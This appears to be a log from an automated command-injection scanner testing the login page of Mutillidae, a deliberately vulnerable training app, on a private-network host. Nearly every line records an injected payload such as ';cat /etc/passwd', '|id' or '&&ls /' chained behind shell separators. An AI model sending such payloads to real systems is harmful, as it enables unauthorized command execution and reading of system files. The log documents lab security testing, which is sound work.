INFO - 
Starting ScanCommandInject scan
INFO - 	No forms found on http://192.168.232.129:80/. Skipping...
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/. Skipping...
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=home.php. Skipping...
INFO - 	Testing payload: ;cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: \ncat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: &cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: |cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: &&cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: ||cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: )cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: ;mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: \nmkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: &mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: |mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: &&mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: ||mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: )mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: &touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: |touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: )touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: ;mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: \nmkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: &mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: |mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: &&mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: ||mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: )mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: &touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: |touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: )touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: ;ls / on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: \nls / on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: &ls / on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: |ls / on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: &&ls / on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: ||ls / on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: )ls / on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: ;id on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: \nid on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: &id on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: |id on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: &&id on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: ||id on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: )id on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: ;uname -a on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: \nuname -a on http://192.168.232.129:80/mutillidae/index.php?page=login.php
INFO - 	Testing payload: &uname -a on http://192.168.232.129:80/mutillidae/index.php?page=login.php
